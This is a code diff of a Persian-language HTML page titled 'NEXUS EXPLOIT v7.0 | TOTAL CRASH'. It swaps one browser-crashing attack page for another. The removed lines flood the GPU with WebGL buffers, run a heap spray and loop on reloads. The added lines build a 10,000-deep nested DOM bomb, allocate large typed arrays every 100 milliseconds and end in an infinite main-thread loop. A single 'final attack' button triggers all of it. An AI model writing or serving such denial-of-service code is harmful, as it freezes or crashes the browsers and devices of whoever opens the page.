@@ -2,77 +2,67 @@
 <html lang="fa" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>NEXUS EXPLOIT v5.0 | REZA</title>
+    <title>NEXUS EXPLOIT v7.0 | TOTAL CRASH</title>
     <style>
-        body { background: #000; color: #ff0000; font-family: 'Courier New', monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .exploit-btn { background: #ff0000; color: #000; border: none; padding: 25px 50px; font-size: 24px; font-weight: 900; border-radius: 5px; cursor: pointer; box-shadow: 0 0 50px #ff0000; transition: 0.3s; }
-        .exploit-btn:hover { transform: scale(1.1); background: #fff; }
+        body { background: #050505; color: white; text-align: center; font-family: sans-serif; overflow: hidden; }
+        .danger-zone { border: 2px solid #ff0055; padding: 50px; margin-top: 100px; display: inline-block; border-radius: 20px; }
+        #kill-switch { background: #ff0055; color: white; border: none; padding: 20px 50px; font-size: 22px; font-weight: bold; cursor: pointer; border-radius: 10px; box-shadow: 0 0 30px #ff0055; }
     </style>
 </head>
 <body>
 
-    <h1 style="letter-spacing: 5px;">SYSTEM VULNERABILITY TEST</h1>
-    <p>Target: Browser Engine Compositor</p>
-    
-    <button id="killBtn" class="exploit-btn">EXECUTE TOTAL CRASH</button>
-
-    <div id="status" style="margin-top: 20px; font-size: 12px; color: #555;">Status: Ready for Payload</div>
+    <div class="danger-zone">
+        <h1>پروژه تست نفوذ رضا</h1>
+        <p>هدف: کرش کامل موتور WebKit/Blink</p>
+        <button id="kill-switch">اجرای حمله نهایی</button>
+    </div>
 
     <script>
-        document.getElementById('killBtn').onclick = function() {
-            document.getElementById('status').innerText = "Payload Injected. Overloading GPU...";
+        document.getElementById('kill-switch').onclick = function() {
+            console.log("حمله آغاز شد...");
             
-            // ۱. حمله به موتور گرافیکی (GPU Memory Overflow)
-            // این بخش باعث می‌شود کل سیستم‌عامل موبایل برای ثانیه‌ای فریز شود
-            function floodGPU() {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            // ۱. بمب درختی (Recursive DOM Bomb)
+            // این بخش هزاران المان را داخل هم می‌سازد. مرورگر برای محاسبه ابعاد این‌ها کرش می‌کند.
+            const crashTheEngine = () => {
+                let root = document.createElement('div');
+                let current = root;
                 
-                // ایجاد بافرهای عظیم که GPU را مجبور به کرش می‌کند
-                setInterval(() => {
-                    const buffer = gl.createBuffer();
-                    gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
-                    gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(10000000), gl.STATIC_DRAW);
-                    
-                    // ایجاد المان‌های سنگین CSS که موتور Compositor را قفل می‌کند
-                    const leak = document.createElement('div');
-                    leak.style.cssText = "width: 100vw; height: 100vh; backdrop-filter: blur(100px); mix-blend-mode: difference; position: fixed; top: 0;";
-                    document.body.appendChild(leak);
-                }, 1);
-            }
-
-            // ۲. نشت حافظه غیرقابل بازگشت (Heap Spraying)
-            // از رشته‌های تصادفی استفاده می‌کنیم تا مرورگر نتواند آن‌ها را فشرده کند
-            let vault = [];
-            function heapSpray() {
-                while(true) {
-                    let chunk = new Array(1000000).fill(Math.random()).join('---');
-                    vault.push(chunk);
-                    
-                    // ایجاد فشار روی تاریخچه برای از کار انداختن کلیدهای سیستمی گوشی
-                    window.history.pushState(null, "", "/" + Math.random());
-                    
-                    if (vault.length > 100) break; // انتقال به مرحله فریز
+                // ایجاد ۱۰,۰۰۰ لایه تودرتو که هیچ مرورگری نمی‌تواند پردازش کند
+                for (let i = 0; i < 10000; i++) {
+                    let next = document.createElement('div');
+                    next.style.cssText = "padding: 1px; backdrop-filter: blur(10px); display: block;";
+                    current.appendChild(next);
+                    current = next;
                 }
-            }
+                document.body.appendChild(root);
+            };
 
-            // ۳. اجرای همزمان (The Kill Switch)
-            try {
-                floodGPU();
-                heapSpray();
-                
-                // فریز کردن نهایی Main Thread
-                const crash = () => {
-                    console.log("CRASHING...");
-                    while(true) {
-                        location.reload(); // درخواست‌های مکرر ریلود همزمان با حلقه بی‌نهایت
+            // ۲. نشت حافظه سخت (Hard Memory Allocation)
+            // استفاده از TypedArrays که مستقیماً رم سخت‌افزاری را درگیر می‌کند
+            let memoryDestroyer = [];
+            const floodRAM = () => {
+                setInterval(() => {
+                    // اختصاص ۱۰۰ مگابایت رم در هر ثانیه به صورت غیرقابل پاکسازی
+                    let buffer = new BigUint64Array(10000000); 
+                    for (let i = 0; i < buffer.length; i++) {
+                        buffer[i] = BigInt(Math.floor(Math.random() * 1000000));
                     }
-                };
-                crash();
-            } catch(e) {
-                location.reload();
-            }
+                    memoryDestroyer.push(buffer);
+                }, 100);
+            };
+
+            // ۳. قفل کردن پردازنده (Main Thread Deadlock)
+            const freezeAll = () => {
+                while(true) {
+                    crashTheEngine(); // فراخوانی مداوم بمب درختی
+                    // ایجاد یک شیء عظیم برای پر کردن Heap
+                    const leak = new Array(1000000).fill(document.body.innerHTML).join('');
+                }
+            };
+
+            // اجرای همزمان تمام لایه‌ها
+            floodRAM();
+            setTimeout(freezeAll, 100);
         };
     </script>
 </body>
